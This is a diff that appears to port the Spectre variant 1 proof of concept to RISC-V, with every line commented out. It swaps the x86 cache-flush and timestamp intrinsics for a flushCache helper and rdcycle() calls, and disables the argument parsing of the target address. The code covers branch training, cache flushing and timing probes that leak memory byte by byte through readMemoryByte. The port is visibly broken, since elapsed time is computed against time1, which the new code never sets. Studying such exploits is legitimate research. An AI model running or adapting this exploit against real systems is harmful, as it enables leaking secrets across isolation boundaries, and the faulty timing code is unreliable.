@@ -1,6 +1,7 @@
 // #include <stdint.h>
 // #include <stdio.h>
 // #include <stdlib.h>
+// #include "encoding.h"
 // #include "cache.h"
 // // #ifdef _MSC_VER
 // // // #include <intrin.h> /* for rdtscp and clflush */
@@ -45,6 +46,7 @@
 //     size_t training_x, x;
 //     register uint64_t time1, time2;
 //     volatile uint8_t *addr;
+//     uint32_t start, diff, passInIdx, randIdx;
 
 //     for (i = 0; i < 256; i++)
 //         results[i] = 0;
@@ -53,12 +55,14 @@
 //     {
 //         /* Flush array2[256*(0..255)] from cache */
 //         for (i = 0; i < 256; i++)
-//             _mm_clflush(&array2[i * 512]); /* clflush */
+//             flushCache((uint32_t) array2, i*512);
+//             // _mm_clflush(&array2[i * 512]); /* clflush */
+
 //         /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
 //         training_x = tries % array1_size;
 //         for (j = 29; j >= 0; j--)
 //         {
-//             _mm_clflush(&array1_size);
+//             flushCache((uint32_t)&array1_size, array1_size);
 //             for (volatile int z = 0; z < 100; z++)
 //             {
 //             }
@@ -83,10 +87,11 @@
 //         {
 //             mix_i = ((i * 167) + 13) & 255;
 //             addr = &array2[mix_i * 512];
-//             time1 = __rdtscp(&junk);
+//             start = rdcycle();
+//             // time1 = __rdtscp(&junk);
 //             junk = *addr;
 //             /* Time memory access */
-//             time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
+//             time2 = rdcycle() - time1; /* Compute elapsed time */
 
 //             if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 //                 results[mix_i]++; /* cache hit -> score +1 for this value */
@@ -129,18 +134,18 @@
 
 //     for (i = 0; i < sizeof(array2); i++)
 //         array2[i] = 1; /* write to array2 to ensure it is memory backed */
-//     if (argc == 3)
-//     {
-//         sscanf(argv[1], "%p", (void **)(&malicious_x));
-//         malicious_x -= (size_t)array1; /* Input value to pointer */
-//         sscanf(argv[2], "%d", &len);
-//     }
-//     printf("Reading %d bytes:\n", len);
+//     // if (argc == 3)
+//     // {
+//     //     sscanf(argv[1], "%p", (void **)(&malicious_x));
+//     //     malicious_x -= (size_t)array1; /* Input value to pointer */
+//     //     sscanf(argv[2], "%d", &len);
+//     // }
+//     // printf("Reading %d bytes:\n", len);
 //     while (--len >= 0)
 //     {
-//         printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+//         // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
 //         readMemoryByte(malicious_x++, value, score);
-//         printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
+//         // printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
 //         printf("0x%02X=’%c’ score=%d ", value[0],
 //                (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 //         if (score[1] > 0)
